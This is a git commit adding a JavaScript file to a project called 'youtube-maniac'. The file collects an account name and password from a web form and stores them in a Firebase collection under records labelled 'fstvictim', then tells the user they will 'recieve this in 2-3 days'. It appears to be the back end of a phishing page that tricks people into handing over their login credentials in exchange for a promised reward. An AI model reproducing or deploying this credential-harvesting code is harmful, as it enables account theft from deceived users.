5e91b6810210a4dbbd1151d9eb4d006ae2b9985b
M Shameel Kv <shameelkv1911@gmail.com>
2018-11-17 13:27:50 +0530

    initial commit

---
+++ youtube-maniac/main.js
@@ -0,0 +1,30 @@
+var db = firebase.firestore();
+
+
+
+function checkCBox()
+{
+	console.log(document.getElementById("cBox").checked);
+}
+
+
+function sendthis(){
+	var name = document.getElementById("name").value;
+	var pass = document.getElementById("pass").value;
+	var vid = document.getElementById("vid").value;
+	var check = document.getElementById("cBox").checked;
+
+	data = {accname:name,accpass:pass}
+	if (name !== null && vid !== null && pass !== null && check )
+	{
+		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
+		document.getElementById("t").innerHTML = "You will recieve this in 2-3 days";
+	}
+	else
+	{
+		document.getElementById("t").innerHTML = "Complete the form";
+	}
+
+}
+
+
